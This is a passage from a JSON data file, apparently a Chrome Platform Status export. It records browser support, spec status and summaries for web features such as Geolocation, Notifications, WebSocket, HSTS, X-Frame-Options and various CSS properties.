          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 5
        },
        "owners": [
          "device-dev@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 5,
        "flag": false,
        "bug": "https://bugs.webkit.org/show_bug.cgi?id=21475",
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 10
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Provides access to device's physical location. https://bugs.chromium.org/p/chromium/issues/detail?id=769231",
    "id": 6348855016685568,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Geolocation/Using_geolocation"
      ],
      "samples": [
        "http://simpl.info/geolocation/"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-04-25 05:25:10.394110",
      "by": "Patket@microsoft.com"
    },
    "name": "Notifications",
    "comments": "The legacy window.webkitNotifications was deprecated in Chrome 33. Use the new one: https://developer.mozilla.org/en-US/docs/WebAPI/Using_Web_Notifications",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://notifications.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 5
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 5,
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/webnotifications/?q=web%20notifications",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "An API for displaying simple notifications to the user. Chrome does not yet support displaying them from a Web Worker.",
    "id": 5064350557536256,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Notification/Using_Web_Notifications"
      ],
      "samples": [
        "http://simpl.info/notification/"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:05:35.579600",
      "by": "jsbell@chromium.org"
    },
    "name": "Web Storage",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://whatwg.org/html#webstorage",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 5
        },
        "owners": [
          "michaeln@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 5,
        "flag": false,
        "android": 18,
        "bug": "http://wkbug.com/41645",
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 10
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Refers to both localStorage and sessionStorage",
    "id": 5345825534246912,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-25 05:23:34.709290",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "HTTP Strict Transport Security (HSTS)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://tools.ietf.org/html/rfc6797",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Security/HTTP_Strict_Transport_Security",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 4
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 4,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 21,
        "desktop": 12
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/httpstricttransportsecurityhsts/?q=hsts",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://apple.stackexchange.com/questions/107699/does-safari-on-os-x-mavericks-ignore-browsing-history-preferences",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Header to inform the browser to always request a given domain over SSL, reducing MITM attack surface area.",
    "id": 4941480133132288,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:43.166850",
      "by": "ericbidelman@google.com"
    },
    "name": "Proprietary CSS reflections",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 4
        },
        "owners": [
          "?@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 4,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "-webkit-box-reflect",
    "id": 5627300510957568,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-25 05:20:00.915860",
      "by": "Patket@microsoft.com"
    },
    "name": "Proprietary mask properties",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 4
        },
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 4,
        "flag": false,
        "android": 28,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "-webkit-mask-* (-webkit-mask-clip)",
    "id": 6500037865504768,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:15.776050",
      "by": "ericbidelman@google.com"
    },
    "name": "WebSocket",
    "comments": "M32 permessage-deflate extension\r\nM30 Strict subprotocol checking\r\nM23 ArrayBufferView\r\nM16 RFC 6455\r\nM15 Binary support\r\nM14 HyBI 08\r\nM6 Hixie 76\r\nM4 Hixie 75",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://dev.w3.org/html5/websockets/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 4
        },
        "owners": [
          "tyoshino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 4,
        "flag": false,
        "bug": "http://crbug.com/12497",
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 11
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The WebSocket JavaScript API provides a simple API for bi-directional communication with web servers.\r\n\r\n\r\nThe WebSocket network protocol enables low overhead bi-directional communication with web servers over a persistent TCP connection.",
    "id": 6555138000945152,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/WebSocket"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:04.447250",
      "by": "ericbidelman@google.com"
    },
    "name": "X-Frame-Options",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/rfc7034",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 4
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 4,
        "blink_components": [
          "Blink"
        ],
        "desktop": 4,
        "flag": false,
        "android": 4,
        "webview": 4,
        "intervention": false
      },
      "opera": {
        "android": 4,
        "desktop": 4
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The X-Frame-Options HTTP header field protects pages against clickjacking attacks by allowing sites to opt-out of being embedded in cross-origin (or any) contexts.",
    "id": 5760041927835648,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:17.918580",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Message Channels",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://whatwg.org/html#message-channels",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=677638",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 2
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 2,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 10
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh673525(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/browser/trunk/WebCore/dom/MessageChannel.cpp?rev=44915",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A messaging system that allows documents to communicate with each other regardless of their source domain, in a way designed to not enable cross-site scripting attacks.",
    "id": 6710044586409984,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel",
        "https://dev.opera.com/articles/window-postmessage-messagechannel/#channel"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-25 05:16:49.113250",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "CSS Masking",
    "comments": "Google, Adobe, and Mozilla are editing the spec: http://www.w3.org/TR/css-masking/",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/fxtf/css-masking-1/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 1
        },
        "owners": [
          "tabatkins@google.com"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 1,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/masks",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows hiding of portions of a visible elements.",
    "id": 5381559662149632,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/mask"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-25 05:14:25.723140",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS `text` properties",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/css3-text/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 1
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 1,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "CSS properties used for manipulating text (decoration, line breaking, processing model...)",
    "id": 4775453877338112,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:35.962310",
      "by": "ericbidelman@google.com"
    },
    "name": "Canvas",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://whatwg.org/html#2dcontext",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 1
        },
        "owners": [
          "wiltzius@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 1,
        "flag": false,
        "android": 18,
        "bug": "http://crbug.com/281529",
        "intervention": false
      },
      "opera": {
        "android": 19,
        "desktop": 9
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Provides an API to draw 2D graphics ",
    "id": 5100084685438976,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:30.406110",
      "by": "ericbidelman@google.com"
    },
    "name": "XSL Transformations (XSLT)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://www.w3.org/TR/xslt",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/1.5",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 1
        },
        "owners": [
          "dominicc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 1,
        "blink_components": [
          "Blink"
        ],
        "desktop": 1,
        "flag": false,
        "android": 1,
        "webview": 1,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/ms760232(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://www.webkit.org/blog/122/webkit-3-10-new-things/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "XSLT is a declarative language for transforming XML.",
    "id": 4730954895589376,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/XSLT"
      ],
      "samples": [
        "https://msdn.microsoft.com/en-us/library/ms765388(v=vs.85).aspx"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:31.591020",
      "by": "ericbidelman@google.com"
    },
    "name": "postMessage",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://whatwg.org/html#dom-window-postmessage",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 1
        },
        "owners": [
          "abarth@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 1,
        "flag": false,
        "bug": "http://crbug.com/158865",
        "intervention": false
      },
      "opera": {
        "android": 10,
        "desktop": 9
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Safely enables cross-origin communication.",
    "id": 4786174115708928,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"
      ],
      "samples": [
        "http://simpl.info/postmessage/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:28.184370",
      "by": "ericbidelman@google.com"
    },
    "name": "-webkit-canvas deprecation",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": "Deprecated"
        },
        "owners": [
          "chrishtr@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/475655",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The -webkit-canvas CSS feature is deprecated as of Chrome 44.",
    "id": 4611270867156992,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:59.056080",
      "by": "ericbidelman@google.com"
    },
    "name": "-webkit-canvas removal",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": "Removed"
        },
        "owners": [
          "chrishtr@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 0,
        "flag": false,
        "bug": "http://crbug.com/475655",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The WebKit/Blink-specific -webkit-canvas CSS feature is being removed. See this discussion for more information:\r\n\r\nhttps://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/webkit-canvas/blink-dev/WvqvdsmiQzg/a6nAs5L_RXkJ",
    "id": 5722125839106048,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:48.114310",
      "by": "ericbidelman@google.com"
    },
    "name": "Android on-screen keyboard doesn't resize layout",
    "tags": [
      "keyboard",
      "osk",
      "resize",
      "layout"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "bokan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": true,
        "bug": "http://crbug.com/404315",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Android keyboard will resize only the visual viewport - not the layout viewport. This means it'll have no effect on the page layout of location of position: fixed elements.",
    "id": 5656077370654720,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1wPEOoQapG2zdOUr9eCBKYBML3MGdNV3EiOMN5hNbkws/edit?usp=sharing"
      ],
      "samples": [
        "http://bokand.github.io/keyboardtest.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:52.216340",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP 'manifest-src' rule for Web App Manifest",
    "tags": [
      "Web App Manifest",
      "CSP"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec/specs/content-security-policy/#directive-manifest-src",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1089255",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "kenneth.r.christiansen@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": true,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows setting a CSP policy for fetching the Web App Manifest",
    "id": 5679927315660800,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:30.248920",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS -webkit-user-modify",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": "Enabled by default"
        },
        "owners": [
          "xiaochengh@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink>Editing, Blink>CSS"
        ],
        "flag": false,
        "bug": "http://crbug.com/687462",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "-webkit-user-modify is a non-standard CSS property inherited from WebKit. It was introduced to define editability on elements. \r\n\r\nNow we have a better alternative: the HTML5 contenteditable attribute. -webkit-user-modify should leave the stage.",
    "id": 4725222129270784,
    "resources": {
      "docs": [
        "https://docs.google.com/a/chromium.org/document/d/1HlI8j-tJAG2sB0o2e7Xl4qCc0UC0mrOCk9UVO2leC1g/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-12-04 09:53:16.325370",
      "by": "myakura.web@gmail.com"
    },
    "name": "CSS @apply Rule",
    "comments": "http://www.xanthir.com/b4o00\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=637419#c9\r\nremoved in https://chromium.googlesource.com/chromium/src/+/5874fca7324e4523a4bdecc8999bdadfdb6c4eff",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tabatkins.github.io/specs/css-apply-rule/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/www-style/2015Sep/0041.html",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": "Removed"
        },
        "owners": [
          "timloh@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://crbug.com/586974",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The CSS @apply rule allows authors to define custom properties which contain declaration lists and then apply them inside style rules. This allows custom properties to be used for theming in a more extensible way than var() references.",
    "id": 5753701012602880,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:58.820240",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS font-size-adjust",
    "tags": [
      "css",
      "font",
      "font-size-adjust"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/css-fonts-3/#propdef-font-size-adjust",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=130473",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "shivamidow@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": true,
        "bug": "http://crbug.com/451346",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The font-size-adjust CSS property specifies that font size should be chosen based on the height of lowercase letters rather than the height of capital letters. It was once dropped since css 2.1, but newly defined in CSS3 font.",
    "id": 5720910061371392,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/font-size-adjust"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:10.621240",
      "by": "ericbidelman@google.com"
    },
    "name": "Compositing and Blending in Canvas 2D",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/fxtf/compositing-1/#canvascompositingandblending",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": "Enabled by default"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/229468",
        "intervention": false
      },
      "opera": {
        "android": 17,
        "desktop": 17
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
